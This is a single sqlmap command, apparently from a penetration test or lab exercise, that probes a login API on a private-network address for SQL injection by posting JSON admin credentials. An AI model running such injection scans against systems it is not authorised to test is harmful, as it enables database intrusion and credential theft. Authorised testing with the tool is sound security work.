sqlmap -u "http://192.168.1.78/api/v1/auth/login" --data '{"user_email": "admin@mail.com","user_password": "password"}' --headers="Content-Type: application/json, Accept: application/json"
